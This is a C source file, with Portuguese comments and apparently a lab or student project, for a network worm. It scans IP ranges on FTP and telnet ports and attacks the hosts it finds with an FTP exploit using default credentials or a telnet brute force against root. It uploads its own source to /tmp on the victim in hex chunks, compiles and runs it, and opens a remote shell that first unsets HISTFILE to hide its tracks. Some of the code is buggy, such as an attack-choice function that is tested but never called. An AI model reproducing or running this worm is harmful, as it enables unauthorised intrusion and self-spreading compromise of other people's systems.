#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>

#include "exploit.h"
#include "recon.h"
#include "brutexor.h"

#define INIT_CMD "unset HISTFILE;id;uname -a;\n"
#define MAX_COMMAND_SIZE 1024
#define FTP_USERNAME "ftp"
#define TELNET_USERNAME "root"
#define FTP_PASSWORD "ftp"

#define MAX(x, y) (((x) > (y)) ? (x) : (y))
#define MIN(x, y) (((x) < (y)) ? (x) : (y))

int runFtpExploit(char *hostname);
int propagate(int fd);
int upload_file(int fd, const char *filename, const char *dest);
int command(int fd, const char *str, ...);
int shell(int fd);
int ftpExploit(open_ip target);
int chooseAttack();
void startTestConnection(range ips[], range ports);
void findWord();

int main(int argc, char *argv[]) {
    range porta;
    range range_ip_a[4];
    range range_ip_b[4];
    range range_ip_c[4];

    porta.start = 21;
    porta.end = 23;
    generateIPs(CLASS_A, range_ip_a);
    generateIPs(CLASS_B, range_ip_b);
    generateIPs(CLASS_C, range_ip_c);
    startTestConnection(range_ip_a, porta);
    startTestConnection(range_ip_b, porta);
    startTestConnection(range_ip_c, porta);
    exit(EXIT_SUCCESS);
}

int ftpExploit(open_ip target){
    int fd, ret;
    printf("# Running FTP exploit...\n");
    fd = runFtpExploit(target.ip);
    if (fd < 0) {
        fprintf(stderr, "Falha no exploit por FTP.\n");
        return 0;
    }
    printf("# Propagating worm...\n");
    ret = propagate(fd);
    if (ret < 0) {
        fprintf(stderr, "Falha ao propagar o worm.\n");
        return 0;
    }
    close(fd);
    return 1;
}

int telnetBruteForce(open_ip target){
    int fd, ret;
    printf("# Running FTP exploit...\n");
    fd = runFtpExploit(target.ip);
    if (fd < 0) {
        fprintf(stderr, "Falha no exploit por FTP.\n");
        return 0;
    }
    printf("# Propagating worm...\n");
    ret = propagate(fd);
    if (ret < 0) {
        fprintf(stderr, "Falha ao propagar o worm.\n");
        return 0;
    }
    close(fd);
    return 1;
}

int chooseAttack(){
    return rand() % 2;
}

void randomAttack(open_ip target){
    if(chooseAttack)
        if(ftpExploit(target) != 1)
            bruteForce(target);
    else
        if(bruteForce(target) != 1)
            ftpExploit(target);
}

int bruteForce(open_ip target){
    findWord(target.ip);
}

/**
*   Função que testa os IPs definidos em ips, utilizando o range de porta definidos em portRange.
**/
void startTestConnection(range ips[], range ports){
    char ip[IP_FIELD_SIZE];
    unsigned int campo1,campo2,campo3,campo4,porta;
    open_ip target;

    for(campo1 = ips[0].start; campo1 <= ips[0].end; campo1++){
        for(campo2 = ips[1].start; campo2 <= ips[1].end; campo2++){
            for(campo3 = ips[2].start; campo3 <= ips[2].end; campo3++){
                for(campo4 = ips[3].start; campo4 <= ips[3].end; campo4++){
                    sprintf(ip,"%d.%d.%d.%d",campo1,campo2,campo3,campo4);
                    strcpy(target.ip,"10.2.0.100");
                    printf("IP: %s\n",target.ip);
                    for(porta = ports.start; porta <= ports.end; porta++){
                        printf("Porta: %d\n",porta);
                        if(porta != 22)
                            if(testConnection("10.2.0.100",porta)){
                                if(porta == FTP)
                                    target.open_ftp = 1;
                                else if(porta == TELNET)
                                    target.open_telnet = 1;
                            }
                            else{
                                printf("Falho\n");
                            }
                    }
                    if(target.open_ftp && target.open_telnet){
                        printf("IP: %s\n com ftp e telnet abertos",ip);
                        //randomAttack(target);
                        bruteForce(target);
                        exit(EXIT_SUCCESS);
                    }
                    else if(target.open_ftp){
                        printf("IP: %s\n com ftp aberto",ip);
                        //ftpExploit(target);
                        bruteForce(target);
                        exit(EXIT_SUCCESS);
                    }
                    else if(target.open_telnet){
                        printf("IP: %s\n com telnet aberto",ip);
                        bruteForce(target);
                        exit(EXIT_SUCCESS);
                    }
                    target.open_ftp = 0;
                    target.open_telnet = 0;
                }
            }
        }
    }
}

int runFtpExploit(char *hostname) {
    int fd, ret;
    target_t *target = NULL;
    char *banner;

    fd = ftp_login(hostname, FTP_USERNAME, FTP_PASSWORD, &banner);
    if (fd <= 0) {
        fprintf(stderr, "Failed to connect (user/pass correct?)\n");
        return -1;
    }

    printf("# Banner: %s\n", (banner == NULL) ? "???" : banner);
    if (target == NULL) {
        target = target_from_banner(banner);
        if (target == NULL) {
            fprintf(stderr, "Failed to get target from banner, aborting...\n");
            return -1;
        }
    }
    printf ("# Target: %s\n", target->desc);

    ret = exploit(fd, target);
    if (ret != 0) {
        return -1;
    }

    return fd;
}

int runTelNetBruteForce(char *hostname,char *password) {
    int fd, ret;
    printf("Tentando IP:%s\n",hostname);
    fd = telnet_login(hostname);
    if (fd <= 0) {
        printf("Falhou IP:%s\n",hostname);
        fprintf(stderr, "Failed to connect (user/pass correct?)\n");
        return -1;
    }

    printf("Tryng user\n");
    command(fd, "root\n");
    printf("Tryng pass\n");
    command(fd, "testenapwd\n");
    printf("Tryng command\n");
    //command(fd, "terminal length 0\n\n");

    command(fd, "touch teste.txt\n\n");


    if (ret != 0) {
        return -1;
    }

    return fd;
}

int propagate(int fd) {
    printf("# Cleaning up and preparing...\n");
    if (command(fd, "rm -rf /tmp/src /tmp/worm") < 0) {
        return -1;
    }
    if (command(fd, "mkdir -p /tmp/src") < 0) {
        return -1;
    }

    printf("# Uploading files...\n");
    if (upload_file(fd, "./main.c", "/tmp/src/main.c") < 0) {
        return -1;
    }
    if (upload_file(fd, "./recon.c", "/tmp/src/recon.c") < 0) {
        return -1;
    }
    if (upload_file(fd, "./recon.h", "/tmp/src/recon.h") < 0) {
        return -1;
    }
    if (upload_file(fd, "./brutexor.c", "/tmp/src/brutexor.c") < 0) {
        return -1;
    }
    if (upload_file(fd, "./brutexor.h", "/tmp/src/brutexor.h") < 0) {
        return -1;
    }
    if (upload_file(fd, "./exploit.c", "/tmp/src/exploit.c") < 0) {
        return -1;
    }
    if (upload_file(fd, "./exploit.h", "/tmp/src/exploit.h") < 0) {
        return -1;
    }
    if (upload_file(fd, "./Makefile", "/tmp/src/Makefile") < 0) {
        return -1;
    }

    printf("# Compiling...\n");
    if (command(fd, "cd /tmp/src/;make clean; make") < 0) {
        return -1;
    }

    printf("# Executing...\n");
    if (command(fd, "./worm") < 0) {
        return -1;
    }

    return 0;
}

int upload_file(int fd, const char *filename, const char *dest) {
    FILE *file;
    int size;
    unsigned char *file_buf;
    unsigned char hex_string[256];
    unsigned char hex[8];
    int i, offset;

    file = fopen(filename, "rb");

    if (file < 0) {
        fprintf(stderr, "Falha ao abrir arquivo '%s'.", filename);
        return -1;
    }

    // get the size of the file
    fseek(file, 0, SEEK_END);
    size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // read the entire file into a buffer
    file_buf = (unsigned char*) malloc(size + 1);
    fread((void*) file_buf, size, 1, file);

    // push the file 16 bytes at a time
    for (i=0; i<size; i+=16) {
        // empty hex_string
        hex_string[0] = 0;

        // write hexadecimal bytes to hex_string
        for (offset=0; offset<MIN(16, size-i); offset++) {
            sprintf(hex, "\\x%02x", file_buf[i+offset]);
            strcat(hex_string, hex);
        }

        // execute a command to echo the hexadecimal bytes to the dest file
        if (command(fd, "(echo -n -e '%s' >> %s)", hex_string, dest) < 0) {
            free(file_buf);
            fclose(file);
            return -1;
        }
    }

    free(file_buf);
    fclose(file);
    return 0;
}

int command(int fd, const char *str, ...) {
    char buf[MAX_COMMAND_SIZE];
    char bufRead[MAX_COMMAND_SIZE];
    va_list vl;

    va_start(vl, str);
    vsnprintf(buf, sizeof(buf), str, vl);
    va_end(vl);

    strcat(buf, " >>/tmp/log 2>&1 && echo ok || echo fail\n");
    write(fd, buf, strlen(buf));
    read(fd, bufRead, sizeof(bufRead));

    printf("\nRetorno: %s\n", bufRead);

    if (strncmp("ok", bufRead, 2) == 0) {
        return 0;
    }
    else {
        return -1;
    }
}

int shell(int fd) {
    char buf[MAX_COMMAND_SIZE];
    fd_set rfds;
    int len;

    write(fd, INIT_CMD, strlen(INIT_CMD));

    while (1) {
        FD_SET(0, &rfds);
        FD_SET(fd, &rfds);

        select(fd + 1, &rfds, NULL, NULL, NULL);
        if (FD_ISSET(0, &rfds)) {
            len = read(0, buf, sizeof(buf));
            if (len == 0) {
                // EOF on stdin
                return 0;
            }
            else if (len < 0) {
                fprintf(stderr, "Error reading from standard input.\n");
                return -1;
            }
            write(fd, buf, len);
        }

        if (FD_ISSET(fd, &rfds)) {
            len = read(fd, buf, sizeof(buf));
            if (len == 0) {
                printf("Connection closed by foreign host.\n");
                return -1;
            }
            else if (len < 0) {
                fprintf(stderr, "Error reading from foreign host.\n");
                return -1;
            }
            write(1, buf, len);
        }
    }

    return 0;
}

void findWord(char *hostname){
    int size = 0;
    int first, second, third, fourth, fifth, sixth, seventh, eighth;
    int second_flag, third_flag, fourth_flag, fifth_flag, sixth_flag, seventh_flag, eighth_flag;
    char first_char, second_char, third_char, fourth_char, fifth_char, sixth_char, seventh_char, eighth_char;
    int word_index = 0;
    char *word;
	char buffer[33];
    
	for(first = 0; first <= 62; first ++){
        first_char = return_char(first, &size);
        
        for(second = return_flag(first); second <= 62; second ++){
            second_char = return_char(second, &size);
            
            for(third = return_flag(second); third <= 62; third ++){
                third_char = return_char(third, &size);
                
                for(fourth = return_flag(third); fourth <= 62; fourth ++){
                    fourth_char = return_char(fourth, &size);
                    
                    word = malloc (size + 2);
                                    
                    int i = 0;
                                    
                    append_char_function(first_char, word, &i);
                    append_char_function(second_char, word, &i);
                    append_char_function(third_char, word, &i);
                    append_char_function(fourth_char, word, &i);;
                    i++;
                    word[i] = '\0';
                    runTelNetBruteForce(hostname, word);
                               
                }
            }
        }
    }
}

// int main(int argc, char **argv){
//     char *ip;
//     int ipRange;
//     int ipLastField;
//     int porta;
//     int portaRange;

    
//     printf("Varredura iniciada em: ");
//     printTimestamp();
//     printf("\n");
//     /* verifica o range de ips */
//     if(argv[1] != NULL){
    
//         if(regexValidation(argv[1], IP_REGEX)) {
//             printf("IP: %s\n", argv[1]);
//             ip = malloc(strlen(argv[1]));
//             strcpy(ip, argv[1]);
//             ipRange = getRange(ip, "-");
//             ipLastField = getLastField(ip);
//             if(ipRange < ipLastField && ipRange != 0){
//                 printf("\nErro:\nValor do range do ip menor do que valor do campo ip\n");
//                 return 0;
//             }
//             else{
//                 if(ipRange == 0)
//                     ipRange = ipLastField;
//             }
//             ip = ipSplit(ip);
//         }
//         else{
//             printf("\nFormato do IP inválido\n");
//             return 0;
//         }
//     }
//     else{
//         printf("\nErro:\nValor do ip não pode ser nulo\n");
//         return 0;
//     }

//     /* verifica o range de portas */
//     if(argv[2] != NULL){
//         if(regexValidation(argv[2], PORT_REGEX)){
//             printf("Portas: %s\n", argv[2]);

//             char *strPorta = malloc(strlen(argv[2]));
//             strcpy(strPorta, argv[2]);
//             portaRange = getRange(strPorta, "-");
//             porta = atoi(strPorta);
//             if(portaRange < porta && portaRange != 0){
//                 printf("\nErro:\nValor do range da porta menor do que valor do campo porta\n");
//                 return 0;
//             }
//             else{
//                 if(portaRange == 0)
//                     portaRange = porta;
//             }
//         }
//         else{
//             printf("\nFormato da porta inválido\n");
//             return 0;
//         }
//     }
//     else{
//         porta = 0;
//         portaRange = 65536;
//         printf("Portas: 0-65536\n");
//     }

//     printf("---\n");
    
//     /* cria uma lista de ips e portas a serem varridos */
//     char ***ips = calloc(1, sizeof(char **));
//     generateIPs(ips, ipLastField, ipRange, ip);

//     /* inicia a varredura */
//     startTestConnection(ips, ipRange - ipLastField, porta, portaRange);
// }
